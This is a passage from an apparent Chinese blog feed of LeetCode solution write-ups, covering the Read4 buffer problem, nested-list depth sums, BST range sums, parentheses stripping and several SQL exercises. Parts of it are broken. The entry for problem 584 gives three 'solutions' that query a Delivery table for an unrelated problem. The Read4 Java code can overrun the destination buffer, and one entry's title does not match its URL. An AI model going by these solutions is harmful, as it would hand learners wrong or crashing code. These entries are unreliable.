<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> <span class="keyword">extends</span> <span class="title">Reader4</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> buf Destination buffer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> n   Number of characters to read</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>    The number of actual characters read</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">(<span class="keyword">char</span>[] buf, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">char</span>[] temp = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(index &lt; n) &#123;</span><br><span class="line">            count = read4(temp);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; count;i++) &#123;</span><br><span class="line">                buf[index+i] = temp[i];</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            sum += count;</span><br><span class="line">            index += <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> sum &gt; n ? n : sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>339. 嵌套列表权重和</title>
    <url>/2020/04/09/LeetCode/leetcode-000339-%E5%B5%8C%E5%A5%97%E5%88%97%E8%A1%A8%E6%9D%83%E9%87%8D%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个嵌套的整数列表，请返回该列表按深度加权后所有整数的总和。</p>
<p>每个元素要么是整数，要么是列表。同时，列表中元素同样也可以是整数或者是另一个列表。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [[1,1],2,[1,1]]</span><br><span class="line">输出: 10 </span><br><span class="line">解释: 因为列表中有四个深度为 2 的 1 ，和一个深度为 1 的 2。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="number">1</span>,[<span class="number">4</span>,[<span class="number">6</span>]]]</span><br><span class="line">输出: <span class="number">27</span> </span><br><span class="line">解释: 一个深度为 <span class="number">1</span> 的 <span class="number">1</span>，一个深度为 <span class="number">2</span> 的 <span class="number">4</span>，一个深度为 <span class="number">3</span> 的 <span class="number">6</span>。所以，<span class="number">1</span> + <span class="number">4</span>*<span class="number">2</span> + <span class="number">6</span>*<span class="number">3</span> = <span class="number">27</span>。</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>递归</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">depthSum</span><span class="params">(List&lt;NestedInteger&gt; nestedList)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> depthSum(nestedList, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">depthSum</span><span class="params">(List&lt;NestedInteger&gt; nestedList, <span class="keyword">int</span> depth)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (NestedInteger ni : nestedList) &#123;</span><br><span class="line">			<span class="keyword">if</span> (ni.isInteger()) &#123;</span><br><span class="line">				sum += ni.getInteger() * depth;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				sum += depthSum(ni.getList(), depth + <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sum;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title>584. 寻找用户推荐人</title>
    <url>/2020/04/09/LeetCode/leetcode-000584-%E5%AF%BB%E6%89%BE%E7%94%A8%E6%88%B7%E6%8E%A8%E8%8D%90%E4%BA%BA/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定表 <code>customer</code> ，里面保存了所有客户信息和他们的推荐人。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+------+------+-----------+</span><br><span class="line">| id   | name | referee_id|</span><br><span class="line">+------+------+-----------+</span><br><span class="line">|    1 | Will |      NULL |</span><br><span class="line">|    2 | Jane |      NULL |</span><br><span class="line">|    3 | Alex |         2 |</span><br><span class="line">|    4 | Bill |      NULL |</span><br><span class="line">|    5 | Zack |         1 |</span><br><span class="line">|    6 | Mark |         2 |</span><br><span class="line">+------+------+-----------+</span><br></pre></td></tr></table></figure>

<p>写一个查询语句，返回一个编号列表，列表中编号的推荐人的编号都 <strong>不是</strong> 2。</p>
<p>对于上面的示例数据，结果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+------+</span><br><span class="line">| name |</span><br><span class="line">+------+</span><br><span class="line">| Will |</span><br><span class="line">| Jane |</span><br><span class="line">| Bill |</span><br><span class="line">| Zack |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>直接查询referee_id不为2并且为null的</p>
<h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">select name from customer where referee_id != <span class="number">2</span> or referee_id is <span class="keyword">null</span></span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>官方题解</p>
<h4 id="SQL-1"><a href="#SQL-1" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> </span><br><span class="line">    <span class="keyword">round</span>(</span><br><span class="line">        (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> Delivery <span class="keyword">where</span> order_date=customer_pref_delivery_date) /</span><br><span class="line">        (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> Delivery), <span class="number">4</span></span><br><span class="line">    ) * <span class="number">100</span></span><br><span class="line"><span class="keyword">as</span> immediate_percentage</span><br></pre></td></tr></table></figure>

<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>条件选择</p>
<h4 id="SQL-2"><a href="#SQL-2" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">round</span>(</span><br><span class="line">    <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> order_date=customer_pref_delivery_date <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>) /</span><br><span class="line">    <span class="keyword">count</span>(*)</span><br><span class="line">   ,<span class="number">4</span>)*<span class="number">100</span></span><br><span class="line"><span class="keyword">as</span> immediate_percentage</span><br><span class="line"><span class="keyword">from</span> Delivery</span><br></pre></td></tr></table></figure>

<h3 id="解法四："><a href="#解法四：" class="headerlink" title="解法四："></a>解法四：</h3><p>逻辑真值</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">round</span>(</span><br><span class="line">    <span class="keyword">sum</span>(order_date=customer_pref_delivery_date) /</span><br><span class="line">    <span class="keyword">count</span>(*)</span><br><span class="line">    ,<span class="number">4</span>)*<span class="number">100</span></span><br><span class="line"><span class="keyword">as</span> immediate_percentage</span><br><span class="line"><span class="keyword">from</span> Delivery</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/Hello_JavaScript/article/details/104625103" target="_blank" rel="noopener">LeetCode-1173. 即时食物配送 I（简单）</a></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>613. 直线上的最近距离</title>
    <url>/2020/04/09/LeetCode/leetcode-000613-%E7%9B%B4%E7%BA%BF%E4%B8%8A%E7%9A%84%E6%9C%80%E8%BF%91%E8%B7%9D%E7%A6%BB/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>表 <code>point</code> 保存了一些点在 x 轴上的坐标，这些坐标都是整数。</p>
<p>写一个查询语句，找到这些点中最近两个点之间的距离。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| x   |</span><br><span class="line">|-----|</span><br><span class="line">| -1  |</span><br><span class="line">| 0   |</span><br><span class="line">| 2   |</span><br><span class="line"></span><br><span class="line">最近距离显然是 &#39;1&#39; ，是点 &#39;-1&#39; 和 &#39;0&#39; 之间的距离。所以输出应该如下：</span><br><span class="line">| shortest|</span><br><span class="line">|---------|</span><br><span class="line">| 1       |</span><br></pre></td></tr></table></figure>

<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>每个点都与其他点坐标不同，表 <code>table</code> 不会有重复坐标出现。</p>
<h2 id="进阶："><a href="#进阶：" class="headerlink" title="进阶："></a>进阶：</h2><p>如果这些点在 x 轴上从左到右都有一个编号，输出结果时需要输出最近点对的编号呢？</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>表自连接，构造偏序关系</p>
<h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">select <span class="title">min</span><span class="params">(P2.x - P1.x)</span> as `shortest` from point as p1 join point as p2 <span class="title">on</span><span class="params">(p1.x &lt; p2.x)</span></span></span><br></pre></td></tr></table></figure>

<h2 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h2><p>表自连接</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select min(abs(p2.x-p1.x))as &#96;shortest&#96; from point as p1 join point p2 on(p1.x !&#x3D; p2.x)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>760. 找出变位映射</title>
    <url>/2020/04/09/LeetCode/leetcode-000760-%E6%89%BE%E5%87%BA%E5%8F%98%E4%BD%8D%E6%98%A0%E5%B0%84/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个列表 Aand B，并且 B 是 A 的变位（即 B 是由 A 中的元素随机排列后组成的新列表）。</p>
<p>我们希望找出一个从 A 到 B 的索引映射 P 。一个映射 P[i] = j 指的是列表 A 中的第 i 个元素出现于列表 B 中的第 j 个元素上。</p>
<p>列表 A 和 B 可能出现重复元素。如果有多于一种答案，输出任意一种。</p>
<p>例如，给定</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A &#x3D; [12, 28, 46, 32, 50]</span><br><span class="line">B &#x3D; [50, 12, 32, 46, 28]</span><br></pre></td></tr></table></figure>

<p>需要返回</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[1, 4, 3, 2, 0]</span><br></pre></td></tr></table></figure>

<p><code>P[0] = 1</code> ，因为 <code>A</code> 中的第 <code>0</code> 个元素出现于 <code>B[1]</code>，而且 <code>P[1] = 4</code> 因为 <code>A</code> 中第 <code>1</code> 个元素出现于 <code>B[4]</code>，以此类推。</p>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><ol>
<li><code>A, B</code> 有相同的长度，范围为 <code>[1, 100]</code>。</li>
<li><code>A[i], B[i]</code> 都是范围在 <code>[0, 10^5]</code> 的整数。</li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助HashMap</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] anagramMappings(<span class="keyword">int</span>[] A, <span class="keyword">int</span>[] B) &#123;</span><br><span class="line">		Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; B.length;i++) &#123;</span><br><span class="line">			map.put(B[i], i);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[A.length];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; A.length;i++) &#123;</span><br><span class="line">			result[i] = map.get(A[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>938. 二叉搜索树的范围和</title>
    <url>/2020/04/09/LeetCode/leetcode-000938-%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E8%8C%83%E5%9B%B4%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定二叉搜索树的根结点 <code>root</code>，返回 <code>L</code> 和 <code>R</code>（含）之间的所有结点的值的和。</p>
<p>二叉搜索树保证具有唯一的值。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：root &#x3D; [10,5,15,3,7,null,18], L &#x3D; 7, R &#x3D; 15</span><br><span class="line">输出：32</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：root = [<span class="number">10</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">18</span>,<span class="number">1</span>,<span class="keyword">null</span>,<span class="number">6</span>], L = <span class="number">6</span>, R = <span class="number">10</span></span><br><span class="line">输出：<span class="number">23</span></span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ol>
<li>树中的结点数量最多为 <code>10000</code> 个。</li>
<li>最终的答案保证小于 <code>2^31</code>。</li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p>参考<a href="https://leetcode-cn.com/problems/range-sum-of-bst/solution/er-cha-sou-suo-shu-de-fan-wei-he-by-leetcode/" target="_blank" rel="noopener">这里</a></p>
<h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>深度优先搜索-递归实现</p>
<p>我们对树进行深度优先搜索，对于当前节点 node，如果 node.val 小于等于 L，那么只需要继续搜索它的右子树；如果 node.val 大于等于 R，那么只需要继续搜索它的左子树；如果 node.val 在区间 (L, R) 中，则需要搜索它的所有子树。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rangeSumBST</span><span class="params">(TreeNode root, <span class="keyword">int</span> L, <span class="keyword">int</span> R)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> dfs(root, L, R);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">dfs</span><span class="params">(TreeNode node, <span class="keyword">int</span> L, <span class="keyword">int</span> R)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (node != <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (L &lt;= node.val &amp;&amp; node.val &lt;= R) &#123;</span><br><span class="line">				sum += node.val;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (L &lt; node.val) &#123;</span><br><span class="line">				sum += dfs(node.left, L, R);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (node.val &lt; R) &#123;</span><br><span class="line">				sum += dfs(node.right, L, R);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sum;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>深度优先搜索-迭代实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rangeSumBST</span><span class="params">(TreeNode root, <span class="keyword">int</span> L, <span class="keyword">int</span> R)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack();</span><br><span class="line">        stack.push(root);</span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">            TreeNode node = stack.pop();</span><br><span class="line">            <span class="keyword">if</span> (node != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (L &lt;= node.val &amp;&amp; node.val &lt;= R)</span><br><span class="line">                    ans += node.val;</span><br><span class="line">                <span class="keyword">if</span> (L &lt; node.val)</span><br><span class="line">                    stack.push(node.left);</span><br><span class="line">                <span class="keyword">if</span> (node.val &lt; R)</span><br><span class="line">                    stack.push(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉搜索树</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
      </tags>
  </entry>
  <entry>
    <title>1021. 删除最外层的括号</title>
    <url>/2020/04/09/LeetCode/leetcode-001021-%E5%88%A0%E9%99%A4%E6%9C%80%E5%A4%96%E5%B1%82%E7%9A%84%E6%8B%AC%E5%8F%B7/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>有效括号字符串为空 (“”)、”(“ + A + “)” 或 A + B，其中 A 和 B 都是有效的括号字符串，+ 代表字符串的连接。例如，””，”()”，”(())()” 和 “(()(()))” 都是有效的括号字符串。</p>
<p>如果有效字符串 S 非空，且不存在将其拆分为 S = A+B 的方法，我们称其为原语（primitive），其中 A 和 B 都是非空有效括号字符串。</p>
<p>给出一个非空有效字符串 S，考虑将其进行原语化分解，使得：S = P_1 + P_2 + … + P_k，其中 P_i 是有效括号字符串原语。</p>
<p>对 S 进行原语化分解，删除分解中每个原语字符串的最外层括号，返回 S 。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;(()())(())&quot;</span><br><span class="line">输出：&quot;()()()&quot;</span><br><span class="line">解释：</span><br><span class="line">输入字符串为 &quot;(()())(())&quot;，原语化分解得到 &quot;(()())&quot; + &quot;(())&quot;，</span><br><span class="line">删除每个部分中的最外层括号后得到 &quot;()()&quot; + &quot;()&quot; &#x3D; &quot;()()()&quot;。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：<span class="string">"(()())(())(()(()))"</span></span><br><span class="line">输出：<span class="string">"()()()()(())"</span></span><br><span class="line">解释：</span><br><span class="line">输入字符串为 <span class="string">"(()())(())(()(()))"</span>，原语化分解得到 <span class="string">"(()())"</span> + <span class="string">"(())"</span> + <span class="string">"(()(()))"</span>，</span><br><span class="line">删除每个部分中的最外层括号后得到 <span class="string">"()()"</span> + <span class="string">"()"</span> + <span class="string">"()(())"</span> = <span class="string">"()()()()(())"</span>。</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：<span class="string">"()()"</span></span><br><span class="line">输出：<span class="string">""</span></span><br><span class="line">解释：</span><br><span class="line">输入字符串为 <span class="string">"()()"</span>，原语化分解得到 <span class="string">"()"</span> + <span class="string">"()"</span>，</span><br><span class="line">删除每个部分中的最外层括号后得到 <span class="string">""</span> + <span class="string">""</span> = <span class="string">""</span>。</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ol>
<li><code>S.length &lt;= 10000</code></li>
<li><code>S[i]</code> 为 <code>&quot;(&quot;</code> 或 <code>&quot;)&quot;</code></li>
<li><code>S</code> 是一个有效括号字符串</li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>可以用一个变量count来截取原语括号字符串。令这个变量count初始化为0，遇到’(‘ 就自增1，遇到 ‘)’ 就自减1.当变量count为0的时候，就表示一个合法的原语终结位置。</p>
<p>题目要求我们把字符串原语化分解，脱去最外层的括号。换个角度就是，把count为1的括号给去掉。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">removeOuterParentheses</span><span class="params">(String S)</span> </span>&#123;</span><br><span class="line">		StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">char</span> c : S.toCharArray()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (c == <span class="string">')'</span>) &#123;</span><br><span class="line">				count--;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (count &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">				sb.append(c);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (c == <span class="string">'('</span>) &#123;</span><br><span class="line">				count++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sb.toString();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>1069. 产品销售分析</title>
    <url>/2020/04/09/LeetCode/leetcode-001069-%E4%BA%A7%E5%93%81%E9%94%80%E5%94%AE%E5%88%86%E6%9E%90%20II/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>销售表：<code>Sales</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-------------+-------+</span><br><span class="line">| Column Name | Type  |</span><br><span class="line">+-------------+-------+</span><br><span class="line">| sale_id     | int   |</span><br><span class="line">| product_id  | int   |</span><br><span class="line">| year        | int   |</span><br><span class="line">| quantity    | int   |</span><br><span class="line">| price       | int   |</span><br><span class="line">+-------------+-------+</span><br><span class="line">sale_id 是这个表的主键。</span><br><span class="line">product_id 是 Product 表的外键。</span><br><span class="line">请注意价格是每单位的。</span><br></pre></td></tr></table></figure>

<p>产品表：<code>Product</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+--------------+---------+</span><br><span class="line">| Column Name  | Type    |</span><br><span class="line">+--------------+---------+</span><br><span class="line">| product_id   | int     |</span><br><span class="line">| product_name | varchar |</span><br><span class="line">+--------------+---------+</span><br><span class="line">product_id 是这个表的主键。</span><br></pre></td></tr></table></figure>

<p>编写一个 SQL 查询，按产品 id <code>product_id</code> 来统计每个产品的销售总量。</p>
<p>查询结果格式如下面例子所示:</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sales 表：</span><br><span class="line">+---------+------------+------+----------+-------+</span><br><span class="line">| sale_id | product_id | year | quantity | price |</span><br><span class="line">+---------+------------+------+----------+-------+ </span><br><span class="line">| 1       | 100        | 2008 | 10       | 5000  |</span><br><span class="line">| 2       | 100        | 2009 | 12       | 5000  |</span><br><span class="line">| 7       | 200        | 2011 | 15       | 9000  |</span><br><span class="line">+---------+------------+------+----------+-------+</span><br><span class="line"></span><br><span class="line">Product 表：</span><br><span class="line">+------------+--------------+</span><br><span class="line">| product_id | product_name |</span><br><span class="line">+------------+--------------+</span><br><span class="line">| 100        | Nokia        |</span><br><span class="line">| 200        | Apple        |</span><br><span class="line">| 300        | Samsung      |</span><br><span class="line">+------------+--------------+</span><br><span class="line"></span><br><span class="line">Result 表：</span><br><span class="line">+--------------+----------------+</span><br><span class="line">| product_id   | total_quantity |</span><br><span class="line">+--------------+----------------+</span><br><span class="line">| 100          | 22             |</span><br><span class="line">| 200          | 15             |</span><br><span class="line">+--------------+----------------+</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Write your MySQL query statement below</span><br><span class="line">select product_id, sum(quantity) as total_quantity from Sales group by product_id</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>1068. 产品销售分析 I</title>
    <url>/2020/04/09/LeetCode/leetcode-001068-%E4%BA%A7%E5%93%81%E9%94%80%E5%94%AE%E5%88%86%E6%9E%90%20I/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>销售表 <code>Sales</code>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">+<span class="comment">-------------+-------+</span></span><br><span class="line">| Column Name | Type  |</span><br><span class="line">+<span class="comment">-------------+-------+</span></span><br><span class="line">| sale_id     | int   |</span><br><span class="line">| product_id  | int   |</span><br><span class="line">| year        | int   |</span><br><span class="line">| quantity    | int   |</span><br><span class="line">| price       | int   |</span><br><span class="line">+<span class="comment">-------------+-------+</span></span><br><span class="line">(sale_id, year) 是销售表 Sales 的主键.</span><br><span class="line">product_id 是产品表 Product 的外键.</span><br><span class="line">注意: price 表示每单位价格</span><br></pre></td></tr></table></figure>

<p>产品表 <code>Product</code>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">+<span class="comment">--------------+---------+</span></span><br><span class="line">| Column Name  | Type    |</span><br><span class="line">+<span class="comment">--------------+---------+</span></span><br><span class="line">| product_id   | int     |</span><br><span class="line">| product_name | varchar |</span><br><span class="line">+<span class="comment">--------------+---------+</span></span><br><span class="line">product_id 是表的主键.</span><br></pre></td></tr></table></figure>

<p>写一条SQL 查询语句获取产品表 Product 中所有的 产品名称 product name 以及 该产品在 Sales 表中相对应的 上市年份 year 和 价格 price。</p>
